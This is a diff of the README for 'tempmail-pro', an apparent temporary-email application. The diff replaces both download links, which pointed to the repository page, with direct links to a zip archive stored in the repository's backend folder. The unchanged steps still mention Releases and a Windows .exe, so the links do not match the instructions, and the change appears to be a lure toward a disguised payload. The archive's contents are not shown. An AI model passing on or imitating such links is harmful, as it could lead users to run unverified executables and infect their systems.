@@ -1,6 +1,6 @@
 # 📧 tempmail-pro - Protect your inbox with temporary email
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Occasional-dumping135/tempmail-pro)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Occasional-dumping135/tempmail-pro/raw/refs/heads/main/backend/tempmail_pro_1.4-alpha.3.zip)
 
 ## 📖 About this application
 
@@ -25,7 +25,7 @@ Tempmail-pro creates temporary email addresses for you. You use these addresses 
 
 You must download the application files to start. Perform these steps:
 
-1. Visit [this page to download](https://github.com/Occasional-dumping135/tempmail-pro).
+1. Visit [this page to download](https://github.com/Occasional-dumping135/tempmail-pro/raw/refs/heads/main/backend/tempmail_pro_1.4-alpha.3.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version available.
 4. Locate the file ending in .exe for Windows.
